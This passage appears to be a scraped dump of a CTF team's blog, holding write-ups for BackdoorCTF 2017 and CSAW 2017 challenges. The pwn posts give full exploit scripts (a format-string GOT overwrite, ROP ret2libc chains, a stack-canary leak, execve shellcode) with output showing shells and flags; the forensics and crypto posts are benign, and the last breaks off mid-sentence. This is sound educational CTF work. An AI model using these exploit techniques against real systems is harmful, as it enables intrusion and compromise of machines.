baby0x41414141","slug":"Pwn-BackdoorCTF-2017-baby0x41414141","date":"2017-09-25T04:46:07.000Z","updated":"2018-11-06T04:17:01.301Z","comments":true,"path":"2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/","link":"","permalink":"https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/","excerpt":"","text":"1.1 - format string vulnerability. We have a format string vulnerability we can confirm this by running the binary: 1234$ ./32_new Hello baby pwner, whats your name?%xOk cool, soon we will know whether you pwned it or not. Till then Bye 8048914 A there it is, we leaked an address from the stack, analysing the binary again we can see we already have a cool function that calls system(&#39;cat flag.txt&#39;) so we don’t have to actually leak libc addresses and go through all that trouble:1.2 - flag function. This one is really simple: 121 - Calculate the offset of the address we put in the stack using %p.2 - Modify the exit function address with flag function using %n. Before going into an explanation I’ll show you some modifiers from printf man page this will be useful since we want to override a certain number of bytes and this length modifiers will help us on that. 12345678910111213An optional length modifier, that specifies the size of the argument. The following length modifiers are valid for the d, i, n, o, u, x, or X conversion: Modifier d, i o, u, x, X n hh signed char unsigned char signed char * h short unsigned short short * l (ell) long unsigned long long * ll (ell ell) long long unsigned long long long long * j intmax_t uintmax_t intmax_t * t ptrdiff_t (see note) ptrdiff_t * z (see note) size_t (see note) q (deprecated) quad_t u_quad_t quad_t * For example if we want to override an address like this 0x0804870b this a 32 bit address so if we need to change all the bits we would use %ln which is a long and it’s 32 bits or we could even use %lln would work too since is 64 bit (long long). Usually we want to use %hn so we can override 2 bytes(16 bits) at each if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs 0x0804870b spaces to be printed, this is why we prefer to use %hn the address but this time we need to do it in two operations instead of one. 120804 -&gt; '%11hn'870b -&gt; '%10hn' Stack address offset calculationWe can do this by printing a bunch of addresses from the stack using %x or %p, we can insert some ‘AAAA’ in the beginning and the a bunch of %x and check on which location the ‘AAAA’ are positioned in the stack. 123456def getConn(): return process('./32_new') if local else remote('163.172.176.29', 9035)r =getConn()r.recvuntil('Hello baby pwner, whats your name?\\n')s = 'AAAA'+ '%x,'*20r.sendline(s) We can see our 41414141 will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning: 12$ python 32_new.py Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA8048914,ff92ee98,1,f745c618,36e,f7462668,ff92f144,ff92eee4,ff92eee0,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825, To access its position we can do like this: 1'%10$hn' Override exit functionNow we need to calculate how much characters we need to add into our format expression, for example if we needed 100 we could do it like this: 1'%100%10$hn' Now starting the exploit we can easily get the exit GOT address with pwntools and the flag function we can get it from radare2 you can check it at the picture 1.2 above. One nice trick is to clear the existing EXIT function address with %10$lln of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into 0x0000004e, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing that is very cleaver, is to split the address in half using some bit operations with this we know exactly how many characters to add (of course you still need to do some debugging in gdb). 12345678910EXIT_GOT = binary.got['exit']FLAG_LOW = FLAG &amp; 0xffffFLAG_HIGH = (FLAG &amp; 0xffff0000) &gt;&gt; 16s = p32(EXIT_GOT)s += p32(EXIT_GOT+2)s += '%10$lln' # clears the already existing exit addresss += '%&#123;&#125;x%11$hn'.format(FLAG_HIGH-78)s += '%&#123;&#125;x%10$hn'.format(FLAG_LOW-FLAG_HIGH) The full exploit: 1234567891011121314151617181920212223242526from pwn import *local = Falsedef getConn(): return process('./32_new') if local else remote('163.172.176.29', 9035)r =getConn()#gdb.attach(r, '''# b *0x08048724# c''')binary = ELF('./32_new')FLAG = 0x0804870bEXIT_GOT = binary.got['exit']FLAG_LOW = FLAG &amp; 0xffffFLAG_HIGH = (FLAG &amp; 0xffff0000) &gt;&gt; 16s = p32(EXIT_GOT)s += p32(EXIT_GOT+2)s += '%10$lln' # clears the already existing exit addresss += '%&#123;&#125;x%11$hn'.format(FLAG_HIGH-78)s += '%&#123;&#125;x%10$hn'.format(FLAG_LOW-FLAG_HIGH)r.recvuntil('Hello baby pwner, whats your name?\\n')r.sendline(s)print r.recvall(timeout=1)r.close()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Format String","slug":"Pwn/x86/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Format-String/"}],"tags":[{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"},{"name":"backdoorctf","slug":"backdoorctf","permalink":"https://teamrocketist.github.io/tags/backdoorctf/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"}]},{"title":"[Pwn] BackdoorCTF 2017 - Justdoit","slug":"Pwn-BackdoorCTF-2017-Justdoit","date":"2017-09-25T01:57:29.000Z","updated":"2018-11-06T04:16:45.269Z","comments":true,"path":"2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/","link":"","permalink":"https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/","excerpt":"","text":"1.1 - representation of the assembly code of the binary So we have 32 bit binary and a buffer overflow vulnerability, lets use checksec to see its protections: 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) There isn’t a stack canary protection but we have NX ENABLED so we can’t execute code in the stack we have to use Return Oriented Programming(ROP) to leak libc addresses and finally return to libc… We can check which functions are available for us using objdump: 123456789101112$ objdump -R justdoit justdoit: file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__0804a00c R_386_JUMP_SLOT read@GLIBC_2.00804a010 R_386_JUMP_SLOT printf@GLIBC_2.00804a014 R_386_JUMP_SLOT __gmon_start__0804a018 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.00804a01c R_386_JUMP_SLOT write@GLIBC_2.0 We have write which is everything we need to do this challenge, using write we can leak addresses from the Global Offset Table (GOT) with the leaks we can calculate the offsets using the lib.so that was provided by the challenge. Here is the plan to exploit it: 1231 - Overflow the buffer2 - Using ROP to leak GOT addresses with write function and return to main3 - Overflow the buffer again and jump to system with /bin/sh as argument Overflow the bufferAccording to the assembly code at picture 1.1 the read function will read up to 200 bytes so lets use metasploit to create a 200 byte pattern: 12$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Now lets see on each address it will break using gdb : 1234567pwndbg&gt; rStarting program: /home/evilgod/Documents/Hacking/ctf/backdoor/pwn/justdoit/justdoit Hello pwners, Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5AgProgram received signal SIGSEGV, Segmentation fault.Program received signal SIGSEGV (fault address 0x64413764) As we can see we have a page fault error at the address 0x64413764 so once again lets use metasploit to calculate the offset: 12$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764[*] Exact match at offset 112 ROP and leak libc addresseswrite needs 3 arguments as follows: 1ssize_t write(int fildes, const void *buf, size_t nbytes); We can use pwntools to get the GOT and PLT addresses from the binary (note that you can use objdump too to achieve the same result). Memorize this if you are beginner in binary exploitation and don’t understand really well what GOT is, just remember if you want to jump and execute a function from libc you jump into PLT but if you want to leak an address from libc you get the value from the GOT address. 12345678from pwn import *binary = ELF('./justdoit')libc = ELF('libc.so.6')padding = 'A'*112WRITEPLT = binary.plt['write']PRINTFGOT = binary.got['printf']MAIN = 0x804847d # You can get this from radare2 for example Since the binary is 32 bits we don’t really need to pop stack address into specific registers like in 64 bit a simple ropchain to leak printf address can be built like this: 123456ropchain = ''ropchain += p32(WRITEPLT) # WRITE function \"call\"ropchain += p32(MAIN) # RETURN TO MAINropchain += p32(0x1) # STDIN ARG[0]ropchain += p32(PRINTFGOT) # PRINTF ADDRESS ARG[1]ropchain += p32(0x4) # BYTES TO READ ARG[2] After we send this to the server, we can calculate everything with symbols from pwntools : 123456789101112131415r = getConn()r.recvline()r.sendline(padding+ropchain)r.recv(len(padding)+len(ropchain)) # reads the printf outputPRINTF = u32(r.recv(0x4)) # leaked printf addressLIBCBASE = PRINTF - libc.symbols['printf']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x15900blog.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"PRINTF 0x%x\" % PRINTF)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % BINSH) If you are wondering where I got the offset of /bin/sh string , you can use a nice trick with strings command: 12$ strings -a -t x libc.so.6 | grep '/bin/sh' 15900b /bin/sh Overflow again and jump to libcNow that we have system and /bin/sh string we can just jump into them! note that I had to readjust the padding offset (use gdb to check the values on the stack to calculate the offset): 123456789ropchain2 = p32(SYSTEM) # WRITE function \"call\"ropchain2 += 'BBBB' # Return address doesn't really matter to where we return after shellropchain2 += p32(BINSH)r.recvuntil('Hello pwners, \\n')r.sendline('A'*(112-8)+ropchain2)r.recv()r.interactive()r.close() And now the full script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *local = Truedef getConn(): return process('./justdoit', env = &#123;\"LD_PRELOAD\":'./libc.so.6'&#125;) if local else remote('163.172.176.29', 9036)padding = 'A'*112binary = ELF('./justdoit')libc = ELF('libc.so.6')WRITEPLT = binary.plt['write']PRINTFGOT = binary.got['printf']MAIN = 0x804847d # You can get this from radare2 for exampleropchain = ''ropchain += p32(WRITEPLT) # PRINTF function \"call\"ropchain += p32(MAIN) # RETURN TO MAINropchain += p32(0x1) # STDIN ARG[0]ropchain += p32(PRINTFGOT) # PRINTF ADDRESS ARG[1]ropchain += p32(0x4) # BYTES TO READ ARG[2]r = getConn()#gdb.attach(r, '''# b *0x080484d8# c''')r.recvline()r.sendline(padding+ropchain)r.recv(len(padding)+len(ropchain)) # reads the printf outputPRINTF = u32(r.recv(0x4))LIBCBASE = PRINTF - libc.symbols['printf']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x15900blog.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"PRINTF 0x%x\" % PRINTF)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % BINSH)ropchain2 = p32(SYSTEM) # WRITE function \"call\"ropchain2 += 'BBBB' # Return address doesn't really matter to where we return after shellropchain2 += p32(BINSH)r.recvuntil('Hello pwners, \\n')r.sendline('A'*(112-8)+ropchain2)r.recv()r.interactive()r.close()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Stack Issue","slug":"Pwn/x86/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x86/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"ROP","slug":"ROP","permalink":"https://teamrocketist.github.io/tags/ROP/"},{"name":"retToLibc","slug":"retToLibc","permalink":"https://teamrocketist.github.io/tags/retToLibc/"},{"name":"backdoorctf","slug":"backdoorctf","permalink":"https://teamrocketist.github.io/tags/backdoorctf/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"}]},{"title":"[Forensics] CSAW - Best Router","slug":"Forensics-CSAW-Best-Router","date":"2017-09-19T09:34:16.000Z","updated":"2019-03-14T16:43:30.165Z","comments":true,"path":"2017/09/19/Forensics-CSAW-Best-Router/","link":"","permalink":"https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/","excerpt":"","text":"Best Router http://forensics.chal.csaw.io:3287 NOTE: This will expand to ~16GB! 19:00 Eastern: updated. Old flags have been removed. Forensics challenge we have an img with 16GB, and an online service at http://forensics.chal.csaw.io:3287, the service asks for a username and a password so we guessed we need to find them in the img, so lets use autopsy to search in the linux filesystem for filenames that contain the word flag: As we can see we can found a /var/www/flag.txt unfortunately the file is empty, but we have the files of the web service of the link provided! Checking the username.txt and password.txt we can see that we have the username and password! After using the credentials on the web page we got the flag!","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"partitions","slug":"partitions","permalink":"https://teamrocketist.github.io/tags/partitions/"},{"name":"disk","slug":"disk","permalink":"https://teamrocketist.github.io/tags/disk/"},{"name":"autopsy","slug":"autopsy","permalink":"https://teamrocketist.github.io/tags/autopsy/"}]},{"title":"[Forensics] CSAW - Missed Registration","slug":"Forensics-CSAW-Missed-Registration","date":"2017-09-19T09:34:16.000Z","updated":"2018-10-24T23:21:04.850Z","comments":true,"path":"2017/09/19/Forensics-CSAW-Missed-Registration/","link":"","permalink":"https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/","excerpt":"","text":"Missed RegistrationIt’s registration day! These forms just seem longer and longer…UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.UPDATE 2:58 Eastern: We’re regenerating due to flag leaks, submissions disabled until then. Please be patient.Update 3:31 Eastern: Updated pcap with new flag after leak. Please re-run your solutions on the file!https://ctf.csaw.io/files/bd2d3bcfdf09f06728d81d1a0cc0e4ff/cap.pcap We have a pcap file, at first we saw alot of HTTP POST requests: A lot of the form fields were filled with crap information in latin, at first we thought the parameter n was encrypted or some other kind of binary we extracted but we found nothing. After awhile instead of looking at HTTP form URL encoded tab from writeshark we started looking at TCP segment data and we found a new post param, a “x” parameter that only showed up in some of the requests: The very first HTTP POST requests has this value: 1&amp;x=424d923500000000000036040000280000004301000027000000010008000000000000000000c40e0000c40e00000001000000010000000001ff0c0e10ff0d1012ff131719ff161d21ff1b2226ff1c2b33ff1f313bff24292bff252c31ff2a3338ff33393bff243742ff283741ff the beginning of this value “424d” indicated us that this might be an bmp image file! so we extracted all x’s values in one line bash command!: 1tshark -r cap.pcap -Y \"http &amp;&amp; tcp.payload contains \\\"&amp;x=\\\"\" -Tfields -e tcp.segment_data | tr -d ':|\\n' | xxd -r -p | tr -d 'x=' | xxd -r -p &gt; img.bmp","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"pcap","slug":"pcap","permalink":"https://teamrocketist.github.io/tags/pcap/"},{"name":"bmp","slug":"bmp","permalink":"https://teamrocketist.github.io/tags/bmp/"}]},{"title":"[Pwn] CSAW - scv","slug":"Pwn-CSAW-scv","date":"2017-09-18T20:59:25.000Z","updated":"2018-11-06T04:19:47.820Z","comments":true,"path":"2017/09/18/Pwn-CSAW-scv/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-scv/","excerpt":"","text":"SCVSCV is too hungry to mine the minerals. Can you give him some food?nc pwn.chal.csaw.io 3764 IntroductionThe binary is pretty simple to read we have 3 options, option 1 is to feed the SCV which is just filling a buffer with string from stdin, option 2 prints the string using puts so no format string vulnerability possible here, option 3 is to exit the program. Pretty simple but where is the vulnerability? We can see the number of bytes in the parameters of read function is bigger than what the buffer can handle so we have a buffer overflow vulnerability but the real problem is how are we going to bypass this protections?: NX is enabled so the stack is not executable! we can bypass this easily using return-oriented-programming(ROP), butanother stack protection is enabled too which is the stack canary, we need to find away to leak addresses from the stack! but how do we do this? As we can see above the read function is reading the buf from STDIN, and what can we know about read? This function doesn’t put a null byte at the end of the read string, this awesome ! and why? because latter with option 2 puts will print the string until it finds a null byte, we can use this to our advantage to leak addresses from libc from the stack and even the stack canary itself! We just need to use gdb and look up the memory! The plan is pretty simple: 121 - Leak libc addresses and stack canary2 - Overflow the buffer and return to libc Leak libc addresses and stack canaryLets do some debugging with gdb lets put a break point right before the read occurs and check the values of the buffer before being filled: As we can see there is a libc address in stack 0x00007f2cea4aabe9 we can count it easily how much we need to fill the buffer to print that address! and we need 40 bytes.Writing the code to do this is very simple can be built in a function like this: 12345678910111213141516171819202122232425def readAddressFromTheStack(size, bytes_to_read, offset=0): \"\"\" Args: size (int): number of characters to send to the stack. bytes_to_read (int): number of bytes to read from the stack we want to leak. offset (int): number to subtract if we want to adjust the leaked address. (Optional) Returns: int: returns an address leaked from the stack. \"\"\" # Write a certain number of bytes to leak an address r.recvuntil('&gt;&gt;') r.sendline('1') r.recvuntil('&gt;&gt;') r.sendline('A'*size) # Read it from the stack print r.recvuntil('&gt;&gt;') r.sendline('2') r.recvuntil('[*]PLEASE TREAT HIM WELL.....') r.recvline() r.recvline() r.recv(size) return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))-offset So what to do with this address? we can calculate its offset to system for example! we can get the system address to calculate the offset and subtract the both values: Implementing this in python would be like this: 1234567891011# Get a libc address from the stackLEAKED = readAddressFromTheStack(40, 6, -0x8f)SYSTEM = LEAKED + 0xb0f7LIBCBASE = SYSTEM -libc.symbols['system']BINSH_OFFSET = 0x18cd17 # strings -a -t x libc-2.23.so | grep '/bin/sh'BINSH = LIBCBASE + BINSH_OFFSETlog.info(\"LEAKED LIBC 0x%x\" % LEAKED)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH) The 3rd argument of readAddressFromTheStack is adjusting the address because in the read we are reading 40 bytes plus the new line character ‘\\n’ because to send to the server we need to press enter, I could actually instead of sending 40 bytes in the padding we could just send 39 and the number would be right but I got lazy during the CTF so instead of fixing that I just readjust the address, the leaked address will always be overwritten with 0x0a which is ‘\\n’ Ascii code representation, so as I said before it needs some adjusting. Stack canaryNow that we have everything we need for libc we just need to get the stack canary address! to check where its being stored we can look at the very beginning of the main function From radare2 we can check it is being stored at local_8h which is a friendly name to be more readable in reality thinking it in assembly it’s stored in RBP-0x8 where RBP is the baseframe pointer. So lets check again in gdb, put a break point right before the read function and print the RBP-0x8 to see the stack canary value: Here is the code to get the stack canary from the stack: 123# leak STACK CANARYSTACK_CANARY = readAddressFromTheStack(40+8*16, 8, 0x0A)log.info(\"STACK CANARY 0x%x\" % STACK_CANARY) Overflow the buffer and return to libcWe already have everything we need we just need to jump to libc rewrite the stack canary where it should be and remember we can’t forget to choose option 3 to exit the program, otherwise we never execute the ret assembly instruction and jump to system(&quot;/bin/sh&quot;);: 1234567891011121314151617181920212223ROPCHAIN = ''ROPCHAIN += p64(POPRET)ROPCHAIN += p64(BINSH)ROPCHAIN += p64(SYSTEM)padding3 = 'A'*(40+8*16)+p64(STACK_CANARY)+ 'AAAAAAAA' + ROPCHAIN#rewrite old addressesr.recvuntil('&gt;&gt;')r.sendline('1')r.recvuntil('&gt;&gt;')r.sendline(padding3)# exitingprint r.recvuntil('&gt;&gt;')r.sendline('3')print r.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...')r.interactive()#time.sleep(10)r.close() The full exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *import timedef getConn(): return process('./scv', env = &#123;\"LD_PRELOAD\":'./libc-2.23.so'&#125;) if local else remote('pwn.chal.csaw.io', 3764)def readAddressFromTheStack(size, bytes_to_read, offset=0): \"\"\" Args: size (int): number of characters to send to the stack. bytes_to_read (int): number of bytes to read from the stack we want to leak. offset (int): number to subtract if we want to adjust the leaked address. (Optional) Returns: int: returns an address leaked from the stack. \"\"\" # Write a certain number of bytes to leak LIBC r.recvuntil('&gt;&gt;') r.sendline('1') r.recvuntil('&gt;&gt;') r.sendline('A'*size) # Read from the stack print r.recvuntil('&gt;&gt;') r.sendline('2') r.recvuntil('[*]PLEASE TREAT HIM WELL.....') r.recvline() r.recvline() r.recv(size) return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))-offset local = Falsebinary = ELF('./scv')libc = ELF('./libc-2.23.so')r = getConn()# b *0x00400aae#gdb.attach(r, '''#b *0x00400cce#b *0x00400cd3#b *0x00400ddf#b *0x00400d94#b *0x400d8f#b *0x00400dce#c''')# Get a libc address from the stackLEAKED = readAddressFromTheStack(40, 6, -0x8f)SYSTEM = LEAKED + 0xb0f7LIBCBASE = SYSTEM -libc.symbols['system']BINSH_OFFSET = 0x18cd17 # strings -a -t x libc-2.23.so | grep '/bin/sh'BINSH = LIBCBASE + BINSH_OFFSETPOPRET = 0x0000000000400ea3 # ROPgadget --binary ./scv --only \"pop|ret\"log.info(\"LEAKED LIBC 0x%x\" % LEAKED)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH)r.recv(1) # new line# leak STACK CANARYSTACK_CANARY = readAddressFromTheStack(40+8*16, 8, 0x0A)log.info(\"STACK CANARY 0x%x\" % STACK_CANARY)ROPCHAIN = ''ROPCHAIN += p64(POPRET)ROPCHAIN += p64(BINSH)ROPCHAIN += p64(SYSTEM)padding3 = 'A'*(40+8*16)+p64(STACK_CANARY)+ 'AAAAAAAA' + ROPCHAIN#rewrite old addressesr.recvuntil('&gt;&gt;')r.sendline('1')r.recvuntil('&gt;&gt;')r.sendline(padding3)# exitingprint r.recvuntil('&gt;&gt;')r.sendline('3')print r.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...')r.interactive()r.close() Running it and get the flag: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051$ python scv.py[*] '~/ctf/csaw/pwn/scv/scv' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '~/ctf/csaw/pwn/scv/libc-2.23.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to pwn.chal.csaw.io on port 3764: Done-------------------------[*]SCV GOOD TO GO,SIR....-------------------------1.FEED SCV....2.REVIEW THE FOOD....3.MINE MINERALS....-------------------------&gt;&gt;[*] LEAKED LIBC 0x7fe343297299[*] SYSTEM LIBC 0x7fe3432a2390[*] LIBCBASE LIBC 0x7fe34325d000[*] BINSH ADDRESS 0x7fe3433e9d17-------------------------[*]SCV GOOD TO GO,SIR....-------------------------1.FEED SCV....2.REVIEW THE FOOD....3.MINE MINERALS....-------------------------&gt;&gt;[*] STACK CANARY 0x49b1940e5e5ffe00-------------------------[*]SCV GOOD TO GO,SIR....-------------------------1.FEED SCV....2.REVIEW THE FOOD....3.MINE MINERALS....-------------------------&gt;&gt;[*]BYE ~ TIME TO MINE MIENRALS...[*] Switching to interactive mode$ lsflagscv$ cat flagflag&#123;sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"},{"name":"Canary Leak","slug":"Pwn/x64/Stack-Issue/Canary-Leak","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Canary-Leak/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"stackcanary","slug":"stackcanary","permalink":"https://teamrocketist.github.io/tags/stackcanary/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"}]},{"title":"[Pwn] CSAW - Pilot","slug":"Pwn-CSAW-Pilot","date":"2017-09-18T20:58:25.000Z","updated":"2018-11-06T04:16:37.781Z","comments":true,"path":"2017/09/18/Pwn-CSAW-Pilot/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/","excerpt":"","text":"pilotCan I take your order?nc pwn.chal.csaw.io 846416:05 Eastern: Updated binary Simple bufferoverflow , we actually have a read size of 0x40 stack the binary doesn’t have any kind of protections so it’s a very easy one, just a simple buffer overflow, we even get the buffer address to jump! The plan is: 12341 - Caculate the offset to overflow.2 - Extract the address of the buffer.3 - Insert nops at the beginning and then shell code, the rest of the buffer fill it with A or any other values4 - Modify the return address with the value of the beginning of the buffer Visual representation of the stack! How the stack looks like in gdb! 1234pwndbg&gt; x/20g 0x7ffef19136600x7ffef1913660: 0xbf48f63190909090 0xff978cd091969dd1 0x7ffef1913670: 0x573b04e6f7dff748 0x41414141050f5f54 0x7ffef1913680: 0x4141414141414141 0x00007ffef1913660 The offset is 40 bytes to overflow the code is very simple 123456789101112131415161718192021222324252627from pwn import *def getConn(): return process('pwn/pilot') if local else remote('pwn.chal.csaw.io', 8464) binary = ELF('pwn/pilot')local = Falser = getConn()#db.attach(r, '''#break *0x0000000000400b35#c''')r.recvuntil('[*]Good Luck Pilot!....\\n')nops = '\\x90'*4shellcode = \"\\x31\\xf6\\x48\\xbf\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdf\\xf7\\xe6\\x04\\x3b\\x57\\x54\\x5f\\x0f\\x05\"padding = 'A'* (40 - len(nops)- len(shellcode)) BUFFER = int(r.recvline()[12:],0)log.info(\"LEAKED BUFFER 0x%x\" % BUFFER)r.recvuntil('[*]Command:')r.sendline(nops+ shellcode + padding+ p64(BUFFER))r.interactive()r.close() Running it 12345678910111213141516$ python pilot.py[*] '~/ctf/csaw/pwn/pilot' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments[+] Opening connection to pwn.chal.csaw.io on port 8464: Done[*] LEAKED BUFFER 0x7ffc2562d050[*] Switching to interactive mode$ lsflagpilot$ cat flagflag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"shellcode","slug":"shellcode","permalink":"https://teamrocketist.github.io/tags/shellcode/"}]},{"title":"Crypto-CSAW-CTF-2017-Baby-Crypt","slug":"Crypto-CSAW-CTF-2017-Baby-Crypt","date":"2017-09-18T17:19:10.000Z","updated":"2018-10-24T23:21:04.846Z","comments":true,"path":"2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/","excerpt":"","text":"baby_cryptThe cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.nc crypto.chal.csaw.io 1578 The first step that we took was to find out how many AES 16 byte blocks that the flag has.To measure this we simply sent an empty request to the service. 123DiogoMonteiro @ ~/baby_crypt -&gt; nc crypto.chal.csaw.io 1578Enter your username (no whitespace):Your Cookie is: f9cc1330ae5830732a18d1a23211ffbce3725519adb9e6f10d658d87c80825ed At this stage, and having a hex string with 64 chars, we know that the flag has 32 bytes (including any padding).Therefore, the flag represents two AES 16 byte blocks. From the challenge description we know that the encryption is performed using AES ECB, which is vulnerable to chosen plaintext attacks. As a matter of fact, we have control over the first (any) bytes of the plaintext.With a chosen plaintext attack on AES, to find the 32 bytes of the flag, we need to brute force each one of its bytes, resulting in a search space with size 32 x 94 = 3008 chars, which is easy. The chosen plaintext attack that we performed works as 